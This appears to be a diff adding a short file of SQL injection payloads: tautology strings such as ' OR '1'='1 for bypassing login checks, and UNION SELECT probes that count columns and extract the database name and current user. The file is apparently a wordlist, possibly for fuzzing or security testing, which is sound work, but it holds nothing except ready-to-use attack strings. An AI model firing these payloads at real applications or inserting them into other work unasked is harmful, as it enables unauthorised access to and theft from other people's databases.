@@ -1,0 +1,13 @@
+' OR '1'='1
+' OR '1'='1' # 
+' OR '1'='1' #
+1' OR '1'='1' # 
+1 OR 1=1
+' OR 'a'='a
+1' UNION SELECT null #
+1' UNION SELECT null, null #
+1' UNION SELECT null, null, null #
+1' UNION SELECT null, null, null, null #
+1' UNION SELECT null, null, null, null, null # 
+1' UNION SELECT database(), null # 
+1' UNION SELECT user(), null #
